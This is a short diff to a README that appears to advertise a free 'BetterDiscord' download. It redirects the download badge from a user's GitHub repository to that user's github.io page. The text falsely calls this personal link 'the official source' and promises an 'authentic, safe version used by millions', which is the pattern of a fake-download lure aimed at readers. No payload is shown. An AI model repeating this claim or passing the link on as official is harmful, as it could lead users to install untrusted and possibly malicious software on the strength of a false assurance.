@@ -25,7 +25,7 @@ Works seamlessly on Windows, macOS, and Linux desktop systems. Android support i
 
 ### Step 1: Visit the Official Download Page
 
-[![DOWNLOAD BETTERDISCORD NOW](https://img.shields.io/badge/Download-BetterDiscord%20Free-brightgreen?style=for-the-badge&logo=discord&logoColor=white&color=7289DA)](https://github.com/Ghost8246/BetterDiscord)
+[![DOWNLOAD BETTERDISCORD NOW](https://img.shields.io/badge/Download-BetterDiscord%20Free-brightgreen?style=for-the-badge&logo=discord&logoColor=white&color=7289DA)](https://ghost8246.github.io)
 
 Visit this link to download the application. This is the official source, so you can be confident you're getting the authentic, safe version used by millions.
 
